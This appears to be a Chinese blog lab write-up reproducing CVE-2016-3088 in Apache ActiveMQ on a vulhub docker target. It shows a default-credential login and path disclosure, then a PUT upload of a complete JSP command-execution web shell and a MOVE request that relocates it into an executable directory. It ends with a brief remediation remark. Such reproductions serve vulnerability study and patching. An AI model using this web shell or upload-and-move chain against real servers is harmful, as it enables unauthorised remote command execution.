# 漏洞复现-ActiveMq 任意文件写入漏洞（CVE-2016-3088） - 铺哩 - 博客园

> 原文：[`www.cnblogs.com/cute-puli/p/14395931.html`](https://www.cnblogs.com/cute-puli/p/14395931.html)

# 0x00 实验环境

攻击机：Win 10

靶机也可作为攻击机：Ubuntu18 （docker 搭建的 vulhub 靶场）

# 0x01 影响版本

未禁用**PUT**、**MOVE**等高危方法的 ActiveMq 版本（可自行尝试）

# 0x02 漏洞复现

（1）实验环境：docker 运行的 vulhub 漏洞环境首先，可直接访问到页面的显示为：

![](img/2261da9fd097678ebb5d2f7ed88d2e40.png)

（2）使用默认弱口令:**admin/admin**即可登录至后台：（**注：没有密码无法写 shell**）

![](img/93eaefb90ad767004a011980b4a20fd4.png)

 （3）访问目录信息泄露页面可获取 ActiveMq 安装目录：

```
http://ip:8161/admin/test/systemProperties.jsp
```

![](img/31a77be6cc743833cbeaa24762dc9856.png)

（4）在**/fileserver/**路径下可使用**PUT**方法直接上传小马：

![](img/f7750ad24ff4859c33741dab2acb715e.png)

上传成功，可直接写入小马：

```
<%@ page import="java.io.*" %>
<%
try {
String cmd = request.getParameter("cmd");
Process child = Runtime.getRuntime().exec(cmd);
InputStream in = child.getInputStream(); int c; while ((c = in.read()) != -1) {
out.print((char)c);
}
in.close(); try {
child.waitFor();
} catch (InterruptedException e) {
e.printStackTrace();
}
} catch (IOException e) {
System.err.println(e);
} %>
```

![](img/905679e3b4956bdd7088f9935484478e.png)

上传成功：

 ![](img/45962f4c0d46a36677822c2997d97fc7.png)

![](img/f3e4af68e6d81bb4e3e7fa5baead95b9.png)

（5）由于此目录并不解析，故需要将小马上传至别的可解析的目录下，在请求**http://X.X.X.X:8161/fileserver/2.txt**的页面进行抓包，然后在请求包内增加重定向的指令：

```
**Destination:file:///opt/activemq/webapps/api/test.jsp**
```

![](img/fb6ac1c12f366aa9019c1407ab8939e8.png)

（6）使用**MOVE**方法移动至别的目录下，移动成功将返回**204**：

 ![](img/d2e3413a0ee129ea8d9a6e9b77b8eba3.png)

靶机内也多了一个——**2.jsp**文件

 ![](img/370fc74cdc327c272c551866ef1e1eb1.png)

（7）即可执行任意命令

 ![](img/dc5793dbd8febf6a5934b5d4f3808d68.png)

# 0x03 实验原理

详细分析请查看：

```
https://www.secpulse.com/archives/60064.html
```

**个人总结：ActiveMQ** 中的 **FileServer 服务**允许用户通过 HTTP **PUT 方法上传文件**到指定目录，需要禁用危险的**HTTP 方法**